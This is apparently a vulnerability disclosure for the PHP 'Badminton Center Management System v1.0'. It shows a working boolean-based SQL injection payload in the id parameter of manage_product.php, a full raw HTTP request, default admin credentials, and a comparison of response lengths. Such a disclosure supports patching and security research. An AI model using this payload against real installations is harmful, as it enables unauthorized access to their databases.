# Badminton Center Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15318/badminton-center-management-system-phpoop-free-source-code.html

Current database name: bcms_db,length is 7

Vulnerability File: /bcms/admin/products/manage_product.php?id=

Vulnerability location: /bcms/admin/products/manage_product.php?id=,id

[+] Payload: /bcms/admin/products/manage_product.php?id=5%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /bcms/admin/products/manage_product.php?id=5%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 2155
![image](https://user-images.githubusercontent.com/54017627/170621280-264e8731-dd0b-4d83-bc58-23aa84bc282f.png)

![image](https://user-images.githubusercontent.com/54017627/170621175-3d52401c-bfbe-415b-a10b-6dc6283ff514.png)

When length (database ()) = 7, Content-Length: 2181
![image](https://user-images.githubusercontent.com/54017627/170621325-48907911-afab-40b9-a589-9ff69cc52c7c.png)

![image](https://user-images.githubusercontent.com/54017627/170621157-c7b790cd-85e6-473d-8dc2-bb29a8d8ea39.png)

